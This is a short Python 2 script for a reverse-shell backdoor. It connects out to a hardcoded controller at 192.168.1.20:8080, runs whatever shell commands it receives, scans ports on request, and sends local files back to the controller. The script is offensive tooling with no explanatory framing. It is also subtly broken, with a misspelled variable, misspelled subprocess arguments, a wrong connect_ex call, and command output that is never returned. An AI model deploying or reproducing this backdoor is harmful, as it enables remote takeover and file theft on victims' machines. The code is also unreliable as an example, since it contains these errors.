#!/usr/bin/python

import socket 
import subprocess
import os


def transfer(s,path):
	if os.path.exists(path):
		f = open(path, 'rb')
		packet = f.read(1024)
		while packet != '':
			s.send(packet)
			packet = f.read(1024)
		s.send('Done')
		f.close()

	else:
		s.send('file not found')

def scanner(s,ip,ports):
	scan_result = ''

	for port in ports.split(','):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			output = sock.connect_ex(ip, int(port))

			if output == 0:
				scan_result = scan_result + "[+] Port "+port+ "is opened" + '/n'


			else:
				scan_result = scan_result + "[-] Port "+port+ "is closed or host unreachable" + '/n'

			sock.close()

		except Exception, e:
			pass	

	s.send (scan_result)

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.20', 8080))

	while True:
		command = s.recv(1024)


		if 'terminate' in command:
			s.close
			break


		elif 'scan' in command:
			command = comand[5:]
			ip,ports = command.split(':')

			scanner(s,ip,ports)


		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, sdterr=subprocess.PIPE, sdtin=subprocess.PIPE)



def main():
	connect()
main()